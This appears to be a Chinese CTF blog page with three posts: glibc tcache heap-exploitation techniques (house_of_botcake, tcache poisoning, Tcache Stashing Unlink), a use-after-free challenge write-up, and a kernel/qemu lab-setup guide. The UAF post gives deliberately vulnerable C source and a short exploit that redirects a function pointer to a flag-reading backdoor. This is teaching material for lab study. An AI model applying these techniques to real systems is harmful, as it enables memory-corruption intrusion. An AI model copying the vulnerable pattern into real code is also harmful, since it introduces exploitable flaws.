+<p>\2. fastbin_reverse_into_tcache:<br>(1)申请14个chunk，都释放掉0-6进入tcache，7-13进入fastbin中。(这14个chunk大小需相等)<br>(2)此时mallco掉7个chunk，就可以将tcache中的7个chunk都申请出来。<br>(3)再利用漏洞修改chunk7的fd为栈上的地址(任意地址)，这时再malloc一次，就会从fastbin中申请chunk，由于fastbin先进后出的关系，会将chunk13申请出来。同时由于tcache机制，当fastbin中对应大小的bin中还存在chunk，就会将这些Chunk都拿出来放进对应大小的tcache中。<br>(4)由于先进后出的关系不变，拿出顺序为chunk12,chunk11…chunk7。进入tcache后的顺序为chunk7,chunk8….chunk12。<br>(5)这样又由于chunk7的fd被我们改掉了，所以实际的顺序为chunk7-&gt;chunk7.fd-&gt;chunk8…</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449078.png" alt="img"><br>(6)同时释放可以向栈上写入堆地址，之后再连续申请就可以将从栈上申请chunk。</p>
+<p>\3. house_of_botcake(只能在double free前提下使用)：<br>(1)申请chunk0-chunk6用于填充tcache，然后申请chunk7,chunk8,chunk9，其中chunk9用于防止和topchunk合并<br>(2)释放chunk0-chunk6填充tcache，释放chunk7，chunk8，发生合并进入unsortedbin中，称为chunk_U。<br>(3)malloc一次，将chunk6从tcache中申请出来，然后再释放chunk8(double free)，这样chunk8就会进入tcache中。现在chunk8就会既在tcache中，又被包含在unsortedbin的chunk_C中。<br>(4)再申请一次大小大于以上chunk_size的chunk_C，这个chunk_C就会将chunk_U切割，同时使得chunk_C包含chunk8，这样就可以从chunk_C修改chunk8的fd指针。<br>(5)由于chunk8同时还在tcache中，那么再连续两次chunk8大小的size就可以将chunk8和chunk8.fd申请出来，实现任意地址申请堆块。</p>
+<p>\4. house_of_einherjar(需要泄露堆地址)：<br>(1)申请3个chunk，chunka,chunkb,chunkc，c的真实size大于0x100；<br>(2)然后通过chunkb的堆溢出(off by one/null)，修改chunkc的in_use位为0，并且在chunkc的prev_size处伪造fake_prev_size=chunkb+chunka-0x10；<br>(3)在chunka中伪造chunk，满足要求：<br>&amp;Fake_chunk = chunka+0x10<br>Fake_chunk-&gt;size = sizeof(chunka) -0x10+sizeof(chunkb)<br>Fake_chunk-&gt;fd = Fake_chunk<br>Fake_chunk-&gt;bk = Fake_chunk<br>用以绕过unlink的检查。<br>(4)随后申请7个与chunkc同大小的chunk，释放填充tcache；<br>(5)释放chunkc，因为chunkc的prev_inuse位被置为0，所以会向上合并，通过fake_prev_size找到前一个堆块，即fake_chunk，并比较fake_prev_size与fake_chunk的size是否相等，如果相等则发生堆合并，进入unlink脱链。<br>(6)此时合并的堆块，会被放入unsortedbin中，而此时的chunkb还处于使用状态，释放chunkb（因为其大小与前面tcache大小不同，会被放入新的tcachebin中）。<br>(7)再申请一个大于chunkc大小的chunk，会直接从unsortedbin中去寻找划分，该chunk就是fakechunk+chunkb，且合理配置chunka和chunkc的大小使得能够覆盖到chunkb的数据，随后通过申请回来的该chunk改写chunkb的fd指针，将chunkb申请回来，再次申请就能够实现tcache poisoning攻击。<br>这里和2.23有点不太一样，这里利用的是再释放chunkb从而使得其进入tcache，修改fd制造tcache poisoning，因为tcache不会检查size，只要fd就可以任意申请。</p>
+<p>\5. house_of_force:一样的，没多大差别</p>
+<p>6.house_of_lore:和2.23差不多，没多大差别</p>
+<p>7.large_bin_attack:和2.23基本一样。</p>
+<p>\8. overlapping_chunks(能够溢出修改size位)：<br>只有free之后修改size的了.</p>
+<p>\9. poison_null_byte:<br>与2.23差不多，不过需要考虑到tcache的影响，有时候需要先填满tcache。一般情况是4个chunk，最后一个chunk防止合并，前三个chunk用来制造堆块重叠，但是中间其实可以插入较多的堆块，制造多个堆块重叠，方便利用。</p>
+<p>\10. tcache_dup:基本没啥用，现在2.27也基本都修复了这个问题，不过做题的时候可以尝试一下看行不行。2.28就已经增加了key字段检查</p>
+<p>11.tcache_ house_of_spirit:<br>与house_of_spirit一样，修改栈上的的chunk指针为栈上的地址，在栈上伪造chunk，只需要伪造size即可，注意in_use位的设置。同时由于tcache在free的时候不会依据chunk的size来对下一个chunk做检查，所以这里不需要伪造下一个chunk的size。</p>
+<p>\12. tcache_poisoning：<br>已经在tcache链表中的chunk，如果修改了fd，那么直接两次malloc即可获得fd对应地址的chunk，不需要构造字节错位，而且malloc之后得到的chunk其pre_size和size都是0。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449154.png" alt="img"></p>
+<p>\13. Tcache Stashing Unlink Attack(需要calloc申请chunk，能够控制smallbin的bk指针)：<br>(1)申请9个chunk，chunk1-chunk9，释放chunk4-chunk9进入tcache中，释放chunk2进入tcache，再顺序释放chunk1和Chunk3进入unsortedbin中。<br>(2)申请一个largebin大小的chunk，使得chunk1和chunk3被整理到smallbin中。<br>(3)申请两个chunk，将chunk2和chunk9从Tcache中申请出来，使得tcache中存在两个空位。<br>(4)利用UAF之类的漏洞修改chunk3的bk指向fake_chunk，这里的chunk3是smallbin中的第一个chunk：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449159.png" alt="img"></p>
+<p>即为图中的0x602390的bk指针，指向一个fake_chunk，栈上的地址。<br>(5)同时由于smallbin按照FIFO的顺序，所以依据bk指针进行寻找，那么如果从smallbin中申请chunk，申请顺序应该是0x602250 —▸ 0x602390 —▸ 0x7fffffffdd10。<br>(6)调用calloc，使得chunk不从tcache中申请，从smallbin中申请，那么就会触发下列在使用smallbin时，只在use tcache的宏定义中的代码：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">while ( tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">&amp;&amp; (tc_victim = last (bin) ) != bin)</span><br><span class="line">&#123;</span><br><span class="line">    //如果成功获取了Chunk</span><br><span class="line">    if (tc_victim != 0)</span><br><span class="line">    &#123;</span><br><span class="line">         // 获取 small bin 中倒数第二个 chunk 。</span><br><span class="line">        bck = tc_victim-&gt;bk;</span><br><span class="line">        //设置标志位</span><br><span class="line">        set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">        // 如果不是 main_arena，设置对应的标志</span><br><span class="line">        if (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (tc_victim);</span><br><span class="line">        //取出最后一个Chunk</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line">        //将其放入到Tcache中</span><br><span class="line">        tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>这样就会将tc_victim，也就是这里的0x602390，通过tcache_put放入到tcache中，同时tcache_put这个函数中没有任何的安全检查，所以可以直接放入。那么由于tcache的FILO关系，依据fd来申请，0x602390的fd为0x7fffffffdd10(fakechunk)，所以会将fakechunk提到tcache的头部。同时又由于tcache中的指针指向的是chunk头部+0x10，那么在tcache中的顺序就是</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449163.png" alt="img"></p>
+<p>这里的0x7fffffffdd20就是fakechunk，再次申请0xa0大小的chunk就可以将fakechunk给申请出来。同时又由于从smallbin链表中的unlink中的bck-&gt;fd = bin的赋值操作，会导致0x7fffffffdd20+0x10处会被赋值上smallbin的libc地址：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449165.png" alt="img"></p>
+<p>这样Tcache Stashing Unlink Attack修改bk为target_addr，malloc后会控制target_addr-0x10，会在target_addr+0x10处写入main_arena_addr。</p>
+<p>14.unsafe_unlink:和2.23差不多，就只是申请的chunk使之大于0x410，从而不使用tcache。</p>
+<p>15.unsorted_bin_attack:申请较大的chunk使得从unsortedbin中重新申请chunk时不会将该大小的chunk放入对应的tcache中。或者修改tcache结构体的counts域，使得系统认为该tcache已经满了，那么就不会放入了。</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/firmianay/CTF-All-In-One/blob/master/doc/3.1.8_heap_exploit_3.md#unsorted_bin_attack" >https://github.com/firmianay/CTF-All-In-One/blob/master/doc/3.1.8_heap_exploit_3.md#unsorted_bin_attack</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>\16. unsorted_bin_into_stack_attack：和2.23差不多，只要满足chunk的大小大于0x408从而不使用tcache即可，或者能够修改tcache结构体的count域。</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/note-UAF/">note-UAF</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.源文件，忘记是哪里的题了。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">struct note *notelist[10];</span><br><span class="line">int count = 0;</span><br><span class="line"></span><br><span class="line">struct note&#123;</span><br><span class="line">  void (*print_note)();</span><br><span class="line">  char *content;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void print_note_content(struct note *ptr_n) </span><br><span class="line">&#123; </span><br><span class="line">  puts(ptr_n -&gt; content); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void add_note()&#123;</span><br><span class="line">  int i;</span><br><span class="line">  char buf[8];</span><br><span class="line">  int size;</span><br><span class="line">  if (count &gt; 10)</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Full&quot;);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  for (i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">    if (!notelist[i])</span><br><span class="line">    &#123;</span><br><span class="line">      notelist[i] = (struct note *)malloc(sizeof(struct note));</span><br><span class="line">      if (!notelist[i])</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Alloca Error&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">      &#125;</span><br><span class="line">      notelist[i] -&gt; print_note = print_note_content;</span><br><span class="line">      printf(&quot;Note size :&quot;);</span><br><span class="line">      read(0, buf, 8);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      notelist[i] -&gt; content = (char *)malloc(size);</span><br><span class="line">      if (!notelist[i] -&gt; content) </span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Alloca Error&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">      &#125;</span><br><span class="line">      printf(&quot;Content :&quot;);</span><br><span class="line">      read(0, notelist[i] -&gt; content, size);</span><br><span class="line">      puts(&quot;Success !&quot;);</span><br><span class="line">      count++;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void del_note() </span><br><span class="line">&#123;</span><br><span class="line">  char buf[4];</span><br><span class="line">  int idx;</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, buf, 4);</span><br><span class="line">  idx = atoi(buf);</span><br><span class="line">  if (idx &lt; 0 || idx &gt;= count) </span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if (notelist[idx]) </span><br><span class="line">  &#123;</span><br><span class="line">    free(notelist[idx]-&gt;content);</span><br><span class="line">    free(notelist[idx]);</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void print_note() </span><br><span class="line">&#123;</span><br><span class="line">  char buf[4];</span><br><span class="line">  int idx;</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, buf, 4);</span><br><span class="line">  idx = atoi(buf);</span><br><span class="line">  if (idx &lt; 0 || idx &gt;= count) </span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if (notelist[idx]) </span><br><span class="line">  &#123;</span><br><span class="line">    notelist[idx] -&gt; print_note(notelist[idx]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void magic() </span><br><span class="line">&#123; </span><br><span class="line">  system(&quot;cat ./flag&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void menu() &#123;</span><br><span class="line">  puts(&quot;----------------------&quot;);</span><br><span class="line">  puts(&quot;       UAF NOTE       &quot;);</span><br><span class="line">  puts(&quot;----------------------&quot;);</span><br><span class="line">  puts(&quot; 1. Add note          &quot;);</span><br><span class="line">  puts(&quot; 2. Delete note       &quot;);</span><br><span class="line">  puts(&quot; 3. Print note        &quot;);</span><br><span class="line">  puts(&quot; 4. Exit              &quot;);</span><br><span class="line">  puts(&quot;----------------------&quot;);</span><br><span class="line">  printf(&quot;Your choice :&quot;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  char buf[4];</span><br><span class="line">  while (1) &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(0, buf, 4);</span><br><span class="line">    switch(atoi(buf)) </span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        add_note();</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        del_note();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        print_note();</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        exit(0);</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;Invalid choice&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>编译一下：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">gcc note.c -no-pie -o note</span><br></pre></td></tr></table></div></figure>
+
+<p>2.打开IDA，查漏洞，del-note函数中存在UAF漏洞，并且还有后门：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if ( notelist[idx] )</span><br><span class="line">&#123;</span><br><span class="line">    free(notelist[idx]-&gt;content);</span><br><span class="line">    free(notelist[idx]);</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">&#125;</span><br><span class="line">//这里经过IDA人工数据修改过，刚打开不会是这样的。</span><br><span class="line">----------------------------------------------------</span><br><span class="line">int magic()</span><br><span class="line">&#123;</span><br><span class="line">    return system(&quot;cat ./flag&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>可以看到在Free之后没有将指针置空，导致Free之后，如果通过程序中的print选项来打印依然可以调用被该指针对应的函数，所以这里存在UAF。</p>
+<p>3.这一题中有一个结构体，定义如下：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191534858.jpeg" alt="img"></p>
+<p>其中malloc顺序是：</p>
+<p>(1)malloc控制数据部分chunk_control，固定大小为0x10。</p>
+<p>(2)将content，也就是真正数据部分malloc出来，chunk_data，这里可以设置size。</p>
+<p>free顺序是：</p>
+<p>(1)先free掉data部分，chunk_data。</p>
+<p>(2)再free控制数据部分的struct，chunk_control。</p>
+<p>4.思考攻击思路，既然有UAF漏洞，那么我们可以想办法Free几个chunk，然后利用fastbins先进后出的原则，将某个控制数据部分的chunk_control申请回来变成我们可以操作的chunk_data，进行fastbins attack。之后修改其中的打印函数地址，改为后门函数地址，那么使用程序中的print就可以跳转后门函数获取flag。</p>
+<p>5.先申请两个结构，data部分至少为0x19，使得chunk_data不落入到0x20的fastbins中。之后释放掉这两个结构，然后fastbins中的结构如下：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">fastbinsY[0]:0x10:chunk_control1-&gt;chunk_control0</span><br><span class="line">fastbinsY[x]:0xxx:chunk_data1-&gt;chunk_data0</span><br></pre></td></tr></table></div></figure>
+
+<p>6.然后申请一个0x10大小的结构，编号A，该结构中的对应就变成这样：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">chunk_controlA=chunk_control1</span><br><span class="line">chunk_dataA=chunk_control0</span><br></pre></td></tr></table></div></figure>
+
+<p>7.现在可以修改chunk_dataA，将其内容改为后门函数地址，然后使用程序中的print，输入索引为0，然后就会运行chunk_control0中的打印函数，也就相当于运行chunk_dataA中的后门函数。</p>
+<p>简单exp如下：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">add(0x20,&#x27;aaaaaaaa&#x27;) #chunk_control0+chunk_data0</span><br><span class="line">add(0x20,&#x27;AAAAAAAA&#x27;) #chunk_control1+chunk_data1</span><br><span class="line">#这里的0x20可以随便改，只要大于等于0x19即可，两个0x20也可以不一样。</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">#free顺序:chunk_data0,chunk_control0,chunk_data1,chunk_control1</span><br><span class="line"></span><br><span class="line">backdoor = p64(elf.sym[&#x27;magic&#x27;])</span><br><span class="line">add(0x10,backdoor)</span><br><span class="line">#malloc顺序:chunk_controlA=chunk_control1,chunk_dataA=chunk_control0</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">print(p.recv())</span><br><span class="line">#获取flag</span><br></pre></td></tr></table></div></figure>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/kernel%E7%BC%96%E8%AF%91/">kernel编译</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.安装依赖：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">sudo apt-get install make gcc bison flex libssl-dev musl-tools</span><br><span class="line">sudo apt-get install libssl-dev</span><br><span class="line">sudo apt-get install gcc make libncurses5-dev openssl libssl-dev </span><br><span class="line">sudo apt-get install build-essential </span><br><span class="line">sudo apt-get install pkg-config</span><br><span class="line">sudo apt-get install libc6-dev</span><br><span class="line">sudo apt-get install bison</span><br><span class="line">sudo apt-get install flex</span><br><span class="line">sudo apt-get install libelf-dev</span><br><span class="line">sudo apt-get install libncurses5-dev libssl-dev </span><br><span class="line">sudo apt-get install build-essential openssl </span><br><span class="line">sudo apt-get install zlibc minizip </span><br><span class="line">sudo apt-get install libidn11-dev libidn11</span><br></pre></td></tr></table></div></figure>
+
+<p>可能有些重复的，没事，够编译环境就行。</p>
+<p>2.下载kernel源码，解压，编译：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">wget https://mirror.tuna.tsinghua.edu.cn/kernel/-------------------</span><br><span class="line">tar -zvxf linux-4.4.70.tar.gz</span><br><span class="line">cd linux-4.4.70</span><br><span class="line">make menuconfig</span><br><span class="line">//这里进入之后直接esc保存退出即可，相关的设置来到之后生成的.config中来</span><br><span class="line"></span><br><span class="line">vim .config</span><br><span class="line">//将CONFIG_MODULE_SIG_ALL,CONFIG_MODULE_SIG_KEY和CONFIG_SYSTEM_TRUSTED_KEYS三项注释掉，编译时系统会自动生成一次性密钥来加密，另外记得把CONFIG_DEBUG_INFO=y去掉，不然新内核带debug信息超大</span><br><span class="line">//这里踩过很多坑，虚拟机直接爆炸，各种错误。</span><br><span class="line"></span><br><span class="line">make</span><br></pre></td></tr></table></div></figure>
+
+<p>但是如果需要直接调试，则看大佬的吧：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://eternalsakura13.com/2018/04/13/qemu/" >https://eternalsakura13.com/2018/04/13/qemu/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>编译完成之后在linux-4.4.70/arch/x86_64/boot/下保存bzImage，用来启动qemu，根目录下有vmlinux，用来分析。</p>
+<p>3.下载busybox源码，解压，编译，制作根目录系统</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">wget https://busybox.net/downloads/busybox-1.19.4.tar.bz2</span><br><span class="line">tar -jxvf busybox-1.30.0.tar.bz2</span><br><span class="line">cd busybox-1.30.0</span><br><span class="line">make menuconfig </span><br><span class="line"># Busybox Settings -&gt; Build Options -&gt; Build Busybox as a static binary</span><br><span class="line">make install</span><br></pre></td></tr></table></div></figure>
+
+<p>之后在busybox-1.30.0/_install/目录下就是根目录文件系统</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191459296.jpeg" alt="img"></p>
+<p>然后就用cpio生成上述的rootfs.cpio，用来配合bzImage启动qemu</p>
+<p>find ./* | cpio -H newc -o &gt; rootfs.cpio</p>
+<p>4.启动qemu:</p>
+<p>(1)将rootfs.cpio、bzImage拖到一个文件夹下</p>
+<p>(2)制作启动文件：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">touch boot.sh</span><br><span class="line">vim boot.sh</span><br></pre></td></tr></table></div></figure>
+
+<p>(3)将下列代码拷入：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">#! /bin/sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic \</span><br></pre></td></tr></table></div></figure>
+
+<p>图形化界面-nographic和console=ttyS0配合使用，启动界面就变成终端。</p>
+<p>最后./boot.sh即可启动qemu虚拟机。</p>
